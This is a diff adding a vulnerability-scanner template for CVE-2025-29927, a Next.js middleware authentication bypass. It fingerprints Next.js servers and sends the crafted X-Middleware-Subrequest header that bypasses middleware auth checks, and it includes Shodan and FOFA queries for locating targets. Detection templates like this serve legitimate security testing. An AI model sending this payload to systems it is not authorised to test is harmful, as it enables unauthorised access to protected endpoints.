@@ -1,0 +1,84 @@
+id: nextjs-middleware-auth-bypass
+info:
+  name: Next.js Middleware Authentication Bypass (CVE-2025-29927)
+  author: hazedic
+  severity: critical
+  description: |
+    Next.js is vulnerable to auth bypass when checks are done in middleware.
+    Use only on protected endpoints to avoid false positives.
+  reference:
+    - https://nvd.nist.gov/vuln/detail/CVE-2025-29927
+    - https://github.com/vercel/next.js/security/advisories/GHSA-f82v-jwr5-mffw
+    - https://slcyber.io/assetnote-security-research-center/doing-the-due-diligence-analysing-the-next-js-middleware-bypass-cve-2025-29927?s=09
+    - https://zhero-web-sec.github.io/research-and-things/nextjs-and-the-corrupt-middleware
+  metadata:
+    verified: true
+    vendor: vercel
+    product: next.js
+    framework: node.js
+    shodan-query:
+      - http.html:"/_next/static"
+      - x-powered-by: next.js
+      - x-nextjs-cache:
+      - cpe:"cpe:2.3:a:zeit:next.js"
+    fofa-query: body="/_next/static"
+  tags: [nextjs, cve-2025-29927, auth-bypass, middleware]
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+    matchers-condition: and
+    matchers:
+      - type: word
+        name: "Next.js Header Detected"
+        part: header
+        words:
+          - "x-nextjs-cache:"
+          - "x-powered-by: next.js"
+          - "x-nextjs-prerender:"
+          - "x-nextjs-stale-time:"
+          - "set-cookie: NEXT_LOCALE="
+        condition: or
+        case-insensitive: true
+      - type: word
+        name: "Next.js Middleware Header Detected"
+        part: header
+        words:
+          - "x-middleware-rewrite:"
+          - "x-middleware-set-cookie:"
+        condition: or
+        case-insensitive: true
+      - type: status
+        status:
+          - 200
+
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+    headers:
+      X-Nextjs-Data: "1"
+      X-Middleware-Subrequest: "src/middleware:nowaf:src/middleware:src/middleware:src/middleware:src/middleware:middleware:middleware:nowaf:middleware:middleware:middleware:pages/_middleware"
+      Accept: "*/*"
+      Accept-Language: "en-US;q=0.9,en;q=0.8"
+      User-Agent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"
+      Cache-Control: "max-age=0"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        name: "x-middleware-subrequest Header Missing"
+        part: header
+        words:
+          - "x-middleware-subrequest"
+        negative: true
+    extractors:
+      - type: regex
+        name: "Next.js Version Extracted"
+        part: header
+        group: 1
+        regex:
+          - "next\\/([0-9.]+)"
+        internal: true
